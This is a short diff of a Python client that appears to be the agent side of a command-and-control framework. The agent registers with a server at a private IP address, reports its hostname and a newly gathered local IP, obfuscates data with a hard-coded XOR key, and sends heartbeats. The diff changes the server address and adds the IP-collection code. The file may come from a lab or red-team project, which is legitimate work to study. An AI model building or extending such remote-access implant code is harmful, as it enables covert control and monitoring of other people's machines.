@@ -2,9 +2,10 @@ import json, subprocess, time, uuid, socket, requests
 import base64
 
 
-SERVER_URL = "http://192.168.1.76:5000"
+SERVER_URL = "http://192.168.1.69:5555"
 hostname = socket.gethostname()
 mac = uuid.getnode()
+
 AGENT_ID = f"Agent-{hostname}" 
 
 def xor(data: str, key="secret") -> str:
@@ -18,9 +19,18 @@ def decrypt(data: str, key="secret") -> str:
 
 def register_agent():
     
-    r = requests.post(f"{SERVER_URL}/register", json={"agent_id": AGENT_ID, "hostname": hostname})
+    r = requests.post(f"{SERVER_URL}/register", json={"agent_id": AGENT_ID, "hostname": hostname, "local_ip": local_ip})
     r.raise_for_status()  # raise error for HTTP codes like 404/500
         
+def get_local_ip():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        s.connect(("8.8.8.8", 80))
+        return s.getsockname()[0]
+    finally:
+        s.close()
+        
+local_ip = get_local_ip()
 
 
 def heartbeat():
